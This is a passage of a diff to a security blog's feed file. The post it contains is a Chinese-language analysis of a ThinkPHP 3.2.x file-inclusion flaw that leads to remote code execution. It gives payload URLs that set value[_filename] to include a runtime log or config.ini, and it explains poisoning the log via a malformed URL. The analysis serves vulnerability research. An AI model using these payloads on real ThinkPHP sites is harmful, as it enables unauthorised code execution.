+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="p"&gt;}&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;payload：&lt;code&gt;?m=Home&amp;amp;c=Index&amp;amp;a=index&amp;amp;value[_filename]=.\Application\Runtime\Logs\Home\21_06_30.log&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;本质上是一个文件包含，再结合报错写log最终达到rce的目的&lt;/p&gt;
+&lt;h2 id="分析-1"&gt;分析
+&lt;/h2&gt;&lt;p&gt;这里我们先不包含log，而是包含config.ini来分析文件包含，payload：&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
+&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-fallback" data-lang="fallback"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;?m=Home&amp;amp;c=Index&amp;amp;a=index&amp;amp;value[_filename]=C://config.ini
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;首先我们的可控参数通过&lt;code&gt;Controller.class.php&lt;/code&gt;中的&lt;code&gt;assign&lt;/code&gt;函数最终跳到了&lt;code&gt;View.class.php&lt;/code&gt;中的&lt;code&gt;assign&lt;/code&gt;函数：
 &lt;img src="https://k1te.cn/p/tp3.2.xrce/image-20220314192829727.png"
 width="449"
 height="69"
-srcset="https://k1te.cn/p/tp3.2.xrce/image-20220314192829727_hu16667192874750647793.png 480w, https://k1te.cn/p/tp3.2.xrce/image-20220314192829727_hu8517754292988693722.png 1024w"
+srcset="https://k1te.cn/p/tp3.2.xrce/image-20220314192829727_hu_b21f23921c29ab04.png 480w, https://k1te.cn/p/tp3.2.xrce/image-20220314192829727_hu_13bd53284eb3997d.png 1024w"
 loading="lazy"
 class="gallery-image"
 data-flex-grow="650"
 data-flex-basis="1561px"
->&lt;/p>
-&lt;p>在该函数中将其赋值给&lt;code>$this-&amp;gt;tVar&lt;/code>变量：&lt;/p>
-&lt;p>&lt;img src="https://k1te.cn/p/tp3.2.xrce/image-20220314193404552.png"
+&gt;&lt;/p&gt;
+&lt;p&gt;在该函数中将其赋值给&lt;code&gt;$this-&amp;gt;tVar&lt;/code&gt;变量：&lt;/p&gt;
+&lt;p&gt;&lt;img src="https://k1te.cn/p/tp3.2.xrce/image-20220314193404552.png"
 width="887"
 height="198"
-srcset="https://k1te.cn/p/tp3.2.xrce/image-20220314193404552_hu1148837238617504674.png 480w, https://k1te.cn/p/tp3.2.xrce/image-20220314193404552_hu16203959136362629107.png 1024w"
+srcset="https://k1te.cn/p/tp3.2.xrce/image-20220314193404552_hu_235eb9dbc4876b6c.png 480w, https://k1te.cn/p/tp3.2.xrce/image-20220314193404552_hu_edf3591b7772ff36.png 1024w"
 loading="lazy"
 class="gallery-image"
 data-flex-grow="447"
 data-flex-basis="1075px"
->&lt;/p>
-&lt;p>赋值结束后回到&lt;code>IndexController&lt;/code>再进入到&lt;code>display&lt;/code>函数，和上面的&lt;code>assign&lt;/code>函数一样最终跳到&lt;code>View.class.php&lt;/code>的&lt;code>display&lt;/code>函数中，该函数中的&lt;code>fetch&lt;/code>函数解析并获取模板文件内容，此时模板文件路径和内容为空：&lt;/p>
-&lt;p>&lt;img src="https://k1te.cn/p/tp3.2.xrce/image-20220314194628910.png"
+&gt;&lt;/p&gt;
+&lt;p&gt;赋值结束后回到&lt;code&gt;IndexController&lt;/code&gt;再进入到&lt;code&gt;display&lt;/code&gt;函数，和上面的&lt;code&gt;assign&lt;/code&gt;函数一样最终跳到&lt;code&gt;View.class.php&lt;/code&gt;的&lt;code&gt;display&lt;/code&gt;函数中，该函数中的&lt;code&gt;fetch&lt;/code&gt;函数解析并获取模板文件内容，此时模板文件路径和内容为空：&lt;/p&gt;
+&lt;p&gt;&lt;img src="https://k1te.cn/p/tp3.2.xrce/image-20220314194628910.png"
 width="926"
 height="268"
-srcset="https://k1te.cn/p/tp3.2.xrce/image-20220314194628910_hu2188691107088160224.png 480w, https://k1te.cn/p/tp3.2.xrce/image-20220314194628910_hu14304364908615236887.png 1024w"
+srcset="https://k1te.cn/p/tp3.2.xrce/image-20220314194628910_hu_34cb82190a7f5e4b.png 480w, https://k1te.cn/p/tp3.2.xrce/image-20220314194628910_hu_279298038dcd9816.png 1024w"
 loading="lazy"
 class="gallery-image"
 data-flex-grow="345"
 data-flex-basis="829px"
->&lt;/p>
-&lt;p>继续跟进&lt;code>fetch&lt;/code>函数，该函数中将空的&lt;code>templateFile&lt;/code>传入&lt;code>parseTemplate&lt;/code>函数:&lt;/p>
-&lt;p>&lt;img src="https://k1te.cn/p/tp3.2.xrce/image-20220314202547680.png"
+&gt;&lt;/p&gt;
+&lt;p&gt;继续跟进&lt;code&gt;fetch&lt;/code&gt;函数，该函数中将空的&lt;code&gt;templateFile&lt;/code&gt;传入&lt;code&gt;parseTemplate&lt;/code&gt;函数:&lt;/p&gt;
+&lt;p&gt;&lt;img src="https://k1te.cn/p/tp3.2.xrce/image-20220314202547680.png"
 width="685"
 height="205"
-srcset="https://k1te.cn/p/tp3.2.xrce/image-20220314202547680_hu18396467309646162402.png 480w, https://k1te.cn/p/tp3.2.xrce/image-20220314202547680_hu15591332239516605305.png 1024w"
+srcset="https://k1te.cn/p/tp3.2.xrce/image-20220314202547680_hu_62c4502403db042f.png 480w, https://k1te.cn/p/tp3.2.xrce/image-20220314202547680_hu_91ecba92a2f2fa7d.png 1024w"
 loading="lazy"
 class="gallery-image"
 data-flex-grow="334"
 data-flex-basis="801px"
->&lt;/p>
-&lt;p>当参数为空时，&lt;code>parseTemplate&lt;/code>函数返回默认的模板文件位置&lt;code>./Application/Home/View/Index/index.html&lt;/code>&lt;/p>
-&lt;p>&lt;img src="https://k1te.cn/p/tp3.2.xrce/image-20220314200109873.png"
+&gt;&lt;/p&gt;
+&lt;p&gt;当参数为空时，&lt;code&gt;parseTemplate&lt;/code&gt;函数返回默认的模板文件位置&lt;code&gt;./Application/Home/View/Index/index.html&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src="https://k1te.cn/p/tp3.2.xrce/image-20220314200109873.png"
 width="685"
 height="226"
-srcset="https://k1te.cn/p/tp3.2.xrce/image-20220314200109873_hu10780829674757274184.png 480w, https://k1te.cn/p/tp3.2.xrce/image-20220314200109873_hu16562431490737696462.png 1024w"
+srcset="https://k1te.cn/p/tp3.2.xrce/image-20220314200109873_hu_be0ebb125e8892a.png 480w, https://k1te.cn/p/tp3.2.xrce/image-20220314200109873_hu_aec4f6430dd5dee9.png 1024w"
 loading="lazy"
 class="gallery-image"
 data-flex-grow="303"
 data-flex-basis="727px"
->&lt;/p>
-&lt;p>接着往下走，系统配置的默认模板引擎为think，所以程序进入else分支&lt;/p>
-&lt;p>&lt;img src="https://k1te.cn/p/tp3.2.xrce/image-20220314202818534.png"
+&gt;&lt;/p&gt;
+&lt;p&gt;接着往下走，系统配置的默认模板引擎为think，所以程序进入else分支&lt;/p&gt;
+&lt;p&gt;&lt;img src="https://k1te.cn/p/tp3.2.xrce/image-20220314202818534.png"
 width="926"
 height="550"
-srcset="https://k1te.cn/p/tp3.2.xrce/image-20220314202818534_hu586646372506602813.png 480w, https://k1te.cn/p/tp3.2.xrce/image-20220314202818534_hu9475359208743805363.png 1024w"
+srcset="https://k1te.cn/p/tp3.2.xrce/image-20220314202818534_hu_265cd14a300c21cf.png 480w, https://k1te.cn/p/tp3.2.xrce/image-20220314202818534_hu_de2999c9e4c88134.png 1024w"
 loading="lazy"
 class="gallery-image"
 data-flex-grow="168"
 data-flex-basis="404px"
->&lt;/p>
-&lt;p>将&lt;code>this-&amp;gt;tVar&lt;/code>放入&lt;code>params&lt;/code>变量中跳入&lt;code>Hook::listen&lt;/code>，&lt;code>tag&lt;/code>变量是写死的&lt;code>view_parse&lt;/code>，因此&lt;code>name&lt;/code>变量为&lt;code>Behavior\ParseTemplateBehavior&lt;/code>，接着进入&lt;code>self::exec&lt;/code>&lt;/p>
-&lt;p>&lt;img src="https://k1te.cn/p/tp3.2.xrce/image-20220314204630431.png"
+&gt;&lt;/p&gt;
+&lt;p&gt;将&lt;code&gt;this-&amp;gt;tVar&lt;/code&gt;放入&lt;code&gt;params&lt;/code&gt;变量中跳入&lt;code&gt;Hook::listen&lt;/code&gt;，&lt;code&gt;tag&lt;/code&gt;变量是写死的&lt;code&gt;view_parse&lt;/code&gt;，因此&lt;code&gt;name&lt;/code&gt;变量为&lt;code&gt;Behavior\ParseTemplateBehavior&lt;/code&gt;，接着进入&lt;code&gt;self::exec&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src="https://k1te.cn/p/tp3.2.xrce/image-20220314204630431.png"
 width="883"
 height="686"
-srcset="https://k1te.cn/p/tp3.2.xrce/image-20220314204630431_hu16528124452292011744.png 480w, https://k1te.cn/p/tp3.2.xrce/image-20220314204630431_hu3278037575816808279.png 1024w"
+srcset="https://k1te.cn/p/tp3.2.xrce/image-20220314204630431_hu_97f0a51c326a442f.png 480w, https://k1te.cn/p/tp3.2.xrce/image-20220314204630431_hu_bc3e6cbb6e52125d.png 1024w"
 loading="lazy"
 class="gallery-image"
 data-flex-grow="128"
 data-flex-basis="308px"
->&lt;/p>
-&lt;p>在&lt;code>exec&lt;/code>函数中调用&lt;code>Behavior\ParseTemplateBehavior&lt;/code>的&lt;code>run&lt;/code>方法处理带有我们可控参数的&lt;code>$params&lt;/code>变量：&lt;/p>
-&lt;p>&lt;img src="https://k1te.cn/p/tp3.2.xrce/image-20220314205526410.png"
+&gt;&lt;/p&gt;
+&lt;p&gt;在&lt;code&gt;exec&lt;/code&gt;函数中调用&lt;code&gt;Behavior\ParseTemplateBehavior&lt;/code&gt;的&lt;code&gt;run&lt;/code&gt;方法处理带有我们可控参数的&lt;code&gt;$params&lt;/code&gt;变量：&lt;/p&gt;
+&lt;p&gt;&lt;img src="https://k1te.cn/p/tp3.2.xrce/image-20220314205526410.png"
 width="486"
 height="201"
-srcset="https://k1te.cn/p/tp3.2.xrce/image-20220314205526410_hu9562397795221540899.png 480w, https://k1te.cn/p/tp3.2.xrce/image-20220314205526410_hu9840742592818162137.png 1024w"
+srcset="https://k1te.cn/p/tp3.2.xrce/image-20220314205526410_hu_e885269f9edf912a.png 480w, https://k1te.cn/p/tp3.2.xrce/image-20220314205526410_hu_2f165ebc39030641.png 1024w"
 loading="lazy"
 class="gallery-image"
 data-flex-grow="241"
 data-flex-basis="580px"
->&lt;/p>
-&lt;p>在run方法中经过一些判断，最终调用&lt;code>fetch&lt;/code>函数编译并加载模板文件，此时第二个参数就是我们的可控参数：array(&amp;quot;_filename&amp;quot;=&amp;gt;&amp;ldquo;C://config.ini&amp;rdquo;);&lt;/p>
-&lt;p>&lt;img src="https://k1te.cn/p/tp3.2.xrce/image-20220314210913491.png"
+&gt;&lt;/p&gt;
+&lt;p&gt;在run方法中经过一些判断，最终调用&lt;code&gt;fetch&lt;/code&gt;函数编译并加载模板文件，此时第二个参数就是我们的可控参数：array(&amp;quot;_filename&amp;quot;=&amp;gt;&amp;ldquo;C://config.ini&amp;rdquo;);&lt;/p&gt;
+&lt;p&gt;&lt;img src="https://k1te.cn/p/tp3.2.xrce/image-20220314210913491.png"
 width="1115"
 height="404"
-srcset="https://k1te.cn/p/tp3.2.xrce/image-20220314210913491_hu10996770989912004906.png 480w, https://k1te.cn/p/tp3.2.xrce/image-20220314210913491_hu9672187218422621868.png 1024w"
+srcset="https://k1te.cn/p/tp3.2.xrce/image-20220314210913491_hu_b7dab9419edb4f57.png 480w, https://k1te.cn/p/tp3.2.xrce/image-20220314210913491_hu_f8ecda63457aedf0.png 1024w"
 loading="lazy"
 class="gallery-image"
 data-flex-grow="275"
 data-flex-basis="662px"
->&lt;/p>
-&lt;p>继续跟进&lt;code>fetch&lt;/code>，获取缓存文件路径后，进入Storage的load方法中：&lt;/p>
-&lt;p>&lt;img src="https://k1te.cn/p/tp3.2.xrce/image-20220314211723255.png"
+&gt;&lt;/p&gt;
+&lt;p&gt;继续跟进&lt;code&gt;fetch&lt;/code&gt;，获取缓存文件路径后，进入Storage的load方法中：&lt;/p&gt;
+&lt;p&gt;&lt;img src="https://k1te.cn/p/tp3.2.xrce/image-20220314211723255.png"
 width="628"
 height="365"
-srcset="https://k1te.cn/p/tp3.2.xrce/image-20220314211723255_hu12439327351795598866.png 480w, https://k1te.cn/p/tp3.2.xrce/image-20220314211723255_hu6216297510177660076.png 1024w"
+srcset="https://k1te.cn/p/tp3.2.xrce/image-20220314211723255_hu_8a23745ad38b9d0a.png 480w, https://k1te.cn/p/tp3.2.xrce/image-20220314211723255_hu_f2632b1c20d31088.png 1024w"
 loading="lazy"
 class="gallery-image"
 data-flex-grow="172"
 data-flex-basis="412px"
->&lt;/p>
-&lt;p>在load方法中，&lt;code>$_filename&lt;/code>为之前获取的缓存文件路径，&lt;code>$var&lt;/code>则为之前带有&lt;code>_filename=C://config.ini&lt;/code>的数组，利用extract方法进行变量覆盖，实现任意文件包含：&lt;/p>
-&lt;p>&lt;img src="https://k1te.cn/p/tp3.2.xrce/image-20220314212032452.png"
+&gt;&lt;/p&gt;
+&lt;p&gt;在load方法中，&lt;code&gt;$_filename&lt;/code&gt;为之前获取的缓存文件路径，&lt;code&gt;$var&lt;/code&gt;则为之前带有&lt;code&gt;_filename=C://config.ini&lt;/code&gt;的数组，利用extract方法进行变量覆盖，实现任意文件包含：&lt;/p&gt;
+&lt;p&gt;&lt;img src="https://k1te.cn/p/tp3.2.xrce/image-20220314212032452.png"
 width="1079"
 height="163"
-srcset="https://k1te.cn/p/tp3.2.xrce/image-20220314212032452_hu8786334477568844574.png 480w, https://k1te.cn/p/tp3.2.xrce/image-20220314212032452_hu16216860117112078952.png 1024w"
+srcset="https://k1te.cn/p/tp3.2.xrce/image-20220314212032452_hu_bfe99414db331bc6.png 480w, https://k1te.cn/p/tp3.2.xrce/image-20220314212032452_hu_37ba6319f2a4b46b.png 1024w"
 loading="lazy"
 class="gallery-image"
 data-flex-grow="661"
 data-flex-basis="1588px"
->&lt;/p>
-&lt;p>&lt;img src="https://k1te.cn/p/tp3.2.xrce/image-20220314212715859.png"
+&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src="https://k1te.cn/p/tp3.2.xrce/image-20220314212715859.png"
 width="600"
 height="343"
-srcset="https://k1te.cn/p/tp3.2.xrce/image-20220314212715859_hu3788058853134331418.png 480w, https://k1te.cn/p/tp3.2.xrce/image-20220314212715859_hu9951118566434817691.png 1024w"
+srcset="https://k1te.cn/p/tp3.2.xrce/image-20220314212715859_hu_c5fd80d866c2f00c.png 480w, https://k1te.cn/p/tp3.2.xrce/image-20220314212715859_hu_62f763d4909c0e75.png 1024w"
 loading="lazy"
 class="gallery-image"
 data-flex-grow="174"
 data-flex-basis="419px"
->&lt;/p>
-&lt;p>众所周知，include函数不在意包含的什么文件：&lt;/p>
-&lt;p>&lt;img src="https://k1te.cn/p/tp3.2.xrce/image-20220314233622026.png"
+&gt;&lt;/p&gt;
+&lt;p&gt;众所周知，include函数不在意包含的什么文件：&lt;/p&gt;
+&lt;p&gt;&lt;img src="https://k1te.cn/p/tp3.2.xrce/image-20220314233622026.png"
 width="983"
 height="327"
-srcset="https://k1te.cn/p/tp3.2.xrce/image-20220314233622026_hu4382227923735885799.png 480w, https://k1te.cn/p/tp3.2.xrce/image-20220314233622026_hu5994275899394673214.png 1024w"
+srcset="https://k1te.cn/p/tp3.2.xrce/image-20220314233622026_hu_98fb2e60f24beccf.png 480w, https://k1te.cn/p/tp3.2.xrce/image-20220314233622026_hu_d7db89c7caf4de14.png 1024w"
 loading="lazy"
 class="gallery-image"
 data-flex-grow="300"
 data-flex-basis="721px"
->&lt;/p>
-&lt;p>因此我们可以构造一个不存在的模块，使得tp报错，此时tp会将url写入log中，所以我们可以在url中写入恶意代码，再结合上面的LFI实现任意代码执行。&lt;/p>
-&lt;blockquote>
-&lt;blockquote>
-&lt;blockquote>
-&lt;blockquote>
-&lt;blockquote>
-&lt;blockquote>
-&lt;blockquote>
-&lt;p>ef5418316bb4efc68bd96772d45afc77caf7808c&lt;/p>
-&lt;/blockquote>
-&lt;/blockquote>
-&lt;/blockquote>
-&lt;/blockquote>
-&lt;/blockquote>
-&lt;/blockquote>
-&lt;/blockquote></description></item></channel></rss>
+&gt;&lt;/p&gt;
+&lt;p&gt;因此我们可以构造一个不存在的模块，使得tp报错，此时tp会将url写入log中，所以我们可以在url中写入恶意代码，再结合上面的LFI实现任意代码执行。&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;blockquote&gt;
+&lt;blockquote&gt;
+&lt;blockquote&gt;
+&lt;blockquote&gt;
+&lt;blockquote&gt;
+&lt;blockquote&gt;
+&lt;p&gt;ef5418316bb4efc68bd96772d45afc77caf7808c&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;/blockquote&gt;
+&lt;/blockquote&gt;
+&lt;/blockquote&gt;
+&lt;/blockquote&gt;
+&lt;/blockquote&gt;
+&lt;/blockquote&gt;</description></item></channel></rss>
